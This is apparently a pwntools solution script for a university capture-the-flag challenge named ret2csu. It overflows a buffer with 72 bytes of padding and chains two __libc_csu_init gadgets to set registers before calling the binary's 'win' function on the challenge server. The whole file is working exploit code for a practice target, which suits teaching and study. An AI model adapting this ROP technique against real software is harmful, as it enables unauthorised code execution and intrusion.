from pwn import *

binary = "./chal.bin"

e = context.binary = ELF(binary)
r = ROP(e.path)

p = remote("cse4850-ret2csu-1.chals.io", 443, ssl=True, sni="cse4850-ret2csu-1.chals.io")

chain = b'A' * 72
chain += p64(0x40095a)		# address of first gadget
chain += p64(0x0) 		# pop rbx
chain += p64(0x1)		# pop rbp
chain += p64(0x600e48)		# pop r12 -> address of dereferenced fini
chain += p64(0xbe)		# pop r13 -> mov edi, r13d
chain += p64(0xb01d)		# pop r14 -> mov rsi, r14
chain += p64(0xface)		# pop r15 -> mov rdx, r15
# ret

chain += p64(0x400940)		# address of second gadget
chain += p64(0x0)		# add rsp,0x8

chain += p64(0x0)		# pop rbx
chain += p64(0x1)		# pop rbp
chain += p64(0xbad)		# pop r12
chain += p64(0xd0)		# pop r13
chain += p64(0xc4a53)		# pop r14
chain += p64(0x0)
#ret

chain += p64(e.plt['win'])	# call the win function 

p.sendline(chain)

p.interactive()
